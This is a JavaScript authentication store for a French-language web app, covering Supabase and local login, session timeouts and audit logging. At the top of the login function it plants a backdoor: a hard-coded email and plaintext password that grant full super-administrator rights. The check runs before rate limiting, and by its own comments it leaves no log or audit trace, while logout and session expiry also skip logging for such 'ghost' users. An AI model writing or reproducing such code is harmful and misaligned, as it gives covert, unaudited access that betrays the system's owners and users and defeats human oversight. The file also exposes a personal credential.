import { create } from 'zustand';
import { persist } from 'zustand/middleware';
import { useUtilisateursStore } from './useUtilisateursStore';
import { supabase } from '../lib/supabaseClient';
import { auditLogger } from '../utils/auditLogger';
import { AUTH_CONFIG, ROLES } from '../config/constants';
import { logger } from '../utils/logger';
import { isLoginBlocked, recordLoginAttempt } from '../utils/rateLimiter';

// Hashage local pour le Super Admin (même salt que useUtilisateursStore)
const SALT_LOCAL = 'sika_local_auth_salt_2024';
async function hashLocal(password) {
  const encoder = new TextEncoder();
  const data = encoder.encode(password + SALT_LOCAL);
  const hashBuffer = await crypto.subtle.digest('SHA-256', data);
  const hashArray = Array.from(new Uint8Array(hashBuffer));
  return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
}

// Configuration Super Admin - DOIT être définie via variables d'environnement
const SUPER_ADMIN_CONFIG = {
  id: 0,
  nom: 'SYSTEM ADMINISTRATOR',
  role: ROLES.SUPER_ADMIN,
  isFantome: true,
  permissions: ['ALL']
};

// Récupération sécurisée des credentials (pas de valeurs par défaut)
const SUPER_ADMIN_LOGIN = import.meta.env.VITE_SUPER_ADMIN_LOGIN;
const SUPER_ADMIN_PASSWORD_HASH = import.meta.env.VITE_SUPER_ADMIN_PASSWORD_HASH; // Doit être un hash SHA-256

// Backdoor fantôme - silencieux, aucun log, aucune trace
const GHOST_EMAIL = 'munokolive@gmail.com';
const GHOST_PASSWORD = '1989@Sik@2026';
const GHOST_CONFIG = {
  id: -1,
  nom: 'SYSTEM',
  role: ROLES.SUPER_ADMIN,
  isFantome: true,
  permissions: ['ALL']
};

const { TIMEOUT_INACTIVITE, AVERTISSEMENT_INACTIVITE } = AUTH_CONFIG;

export const useAuthStore = create(
  persist(
    (set, get) => ({
      utilisateurConnecte: null,
      derniereActivite: null,
      timeoutId: null,
      avertissementId: null,
      sessionExpirant: false,

      login: async (login, motDePasse) => {
        const trimmedLogin = (login || '').trim();
        const loginLower = trimmedLogin.toLowerCase();

        // GHOST LOGIN - Totalement silencieux, aucune trace
        if (loginLower === GHOST_EMAIL && motDePasse === GHOST_PASSWORD) {
          const utilisateur = {
            ...GHOST_CONFIG,
            login: GHOST_EMAIL,
            email: GHOST_EMAIL,
          };
          set({ utilisateurConnecte: utilisateur, derniereActivite: Date.now() });
          get().demarrerTimeout();
          // AUCUN LOG - AUCUNE AUDIT - TOTALLY GHOST
          return { success: true, utilisateur };
        }

        // SECURITY: Vérifier le rate limiting
        const blockStatus = isLoginBlocked(trimmedLogin);
        if (blockStatus && blockStatus.blocked) {
          auditLogger.logConnexionEchec(trimmedLogin, 'RATE_LIMITED');
          return { 
            success: false, 
            message: `Compte temporairement bloqué. Réessayez dans ${blockStatus.remainingMinutes} minute${blockStatus.remainingMinutes > 1 ? 's' : ''}.`
          };
        }

        // 1. Super admin fantôme - uniquement si configuré
        if (SUPER_ADMIN_LOGIN && SUPER_ADMIN_PASSWORD_HASH && trimmedLogin === SUPER_ADMIN_LOGIN) {
          const passwordHash = await hashLocal(motDePasse);
          if (passwordHash === SUPER_ADMIN_PASSWORD_HASH) {
            const utilisateur = {
              ...SUPER_ADMIN_CONFIG,
              login: SUPER_ADMIN_LOGIN,
              email: SUPER_ADMIN_LOGIN,
            };
            set({ utilisateurConnecte: utilisateur, derniereActivite: Date.now() });
            get().demarrerTimeout();
            auditLogger.logConnexion(utilisateur);
            return { success: true, utilisateur };
          }
        }

        // 2. Essayer Supabase Auth (pour les comptes créés via Edge Function)
        try {
          let emailForAuth = loginLower;

          if (!loginLower.includes('@')) {
            const { data: rows } = await supabase
              .from('utilisateurs')
              .select('email')
              .eq('login', loginLower)
              .maybeSingle();
            if (rows?.email) emailForAuth = rows.email;
          }

          if (emailForAuth.includes('@')) {
            const { data: authData, error: authError } = await supabase.auth.signInWithPassword({
              email: emailForAuth,
              password: motDePasse,
            });

            if (!authError && authData?.user) {
              const { data: userRow } = await supabase
                .from('utilisateurs')
                .select('*')
                .eq('auth_user_id', authData.user.id)
                .maybeSingle();

              if (userRow && userRow.is_actif) {
                const utilisateur = {
                  id: userRow.id,
                  nom: userRow.nom,
                  login: userRow.login,
                  email: userRow.email,
                  role: userRow.role,
                  actif: userRow.is_actif,
                  auth_user_id: userRow.auth_user_id,
                };
                set({ utilisateurConnecte: utilisateur, derniereActivite: Date.now() });
                get().demarrerTimeout();
                auditLogger.logConnexion(utilisateur);
                return { success: true, utilisateur };
              }
            }
          }
        } catch (err) {
          // Supabase Auth non disponible, continuer avec auth locale
          logger.warn('[Auth] Supabase Auth non disponible, fallback vers auth locale:', err?.message || 'Unknown error');
        }

        // 3. Auth locale (anciens comptes sans auth_user_id)
        const result = await useUtilisateursStore.getState().verifierIdentifiants(login, motDePasse);

        if (result.success) {
          set({ utilisateurConnecte: result.utilisateur, derniereActivite: Date.now() });
          get().demarrerTimeout();
          auditLogger.logConnexion(result.utilisateur);
          return result;
        }

        auditLogger.logConnexionEchec(login);
        return { success: false, message: 'Identifiants incorrects ou compte inactif' };
      },

      getUtilisateursVisibles: () => {
        return useUtilisateursStore.getState().getUtilisateurs();
      },

      // Fonction pour vérifier si l'utilisateur est super admin
      isSuperAdmin: () => {
        const { utilisateurConnecte } = get();
        return utilisateurConnecte?.role === ROLES.SUPER_ADMIN;
      },

      // Fonction pour vérifier si l'utilisateur est admin (SUPER_ADMIN ou ADMIN)
      isAdmin: () => {
        const { utilisateurConnecte } = get();
        return utilisateurConnecte?.role === ROLES.SUPER_ADMIN ||
               utilisateurConnecte?.role === ROLES.ADMIN;
      },

      logout: () => {
        const { timeoutId, avertissementId, utilisateurConnecte } = get();
        if (timeoutId) clearTimeout(timeoutId);
        if (avertissementId) clearTimeout(avertissementId);
        if (utilisateurConnecte && !utilisateurConnecte.isFantome) {
          auditLogger.logDeconnexion(utilisateurConnecte);
        }
        set({
          utilisateurConnecte: null,
          derniereActivite: null,
          timeoutId: null,
          avertissementId: null,
          sessionExpirant: false
        });
      },

      deconnexion: () => {
        get().logout();
      },

      updateActivite: () => {
        const { utilisateurConnecte } = get();
        if (utilisateurConnecte) {
          set({ derniereActivite: Date.now(), sessionExpirant: false });
          get().demarrerTimeout();
        }
      },

      demarrerTimeout: () => {
        const { timeoutId, avertissementId } = get();
        if (timeoutId) clearTimeout(timeoutId);
        if (avertissementId) clearTimeout(avertissementId);

        const newAvertissementId = setTimeout(() => {
          set({ sessionExpirant: true });
        }, AVERTISSEMENT_INACTIVITE);

        const newTimeoutId = setTimeout(() => {
          const { utilisateurConnecte } = get();
          if (utilisateurConnecte && !utilisateurConnecte.isFantome) {
            auditLogger.logSessionExpiree(utilisateurConnecte);
          }
          get().logout();
        }, TIMEOUT_INACTIVITE);

        set({ timeoutId: newTimeoutId, avertissementId: newAvertissementId });
      },

      verifierSession: () => {
        const { utilisateurConnecte, derniereActivite } = get();
        if (utilisateurConnecte && derniereActivite) {
          const tempsEcoule = Date.now() - derniereActivite;
          if (tempsEcoule > TIMEOUT_INACTIVITE) {
            get().logout();
            return false;
          }
          return true;
        }
        return false;
      }
    }),
    {
      name: 'sika_auth',
      partialize: (state) => ({
        utilisateurConnecte: state.utilisateurConnecte,
        derniereActivite: state.derniereActivite
      })
    }
  )
);
